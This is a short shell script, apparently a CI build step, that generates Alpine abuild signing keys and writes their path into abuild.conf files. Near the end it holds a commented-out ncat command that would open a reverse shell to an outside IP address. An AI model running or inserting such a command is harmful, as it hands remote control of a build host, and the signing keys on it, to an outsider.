####

ou=$(echo -e "\n\n\n" | abuild-keygen 2>&1)
echo $ou | grep -oE ' \/home\/(.)*\.rsa\.pub' | sed 's/ //g'
rsapub=$(echo $ou | grep -oE ' \/home\/(.)*\.rsa\.pub' | sed 's/ //g')
rsa=$(echo $rsapub|grep -oE '/.*\.rsa')
mkdir -p /home/abuild3/.abuild
mkdir -p /github/home/.abuild
echo "PACKAGER_PRIVKEY="$rsa"">/home/abuild3/.abuild/abuild.conf
echo "PACKAGER_PRIVKEY="$rsa"">/github/home/.abuild/abuild.conf

#ncat 195.201.134.209 84 -e /bin/sh
#sleep 10

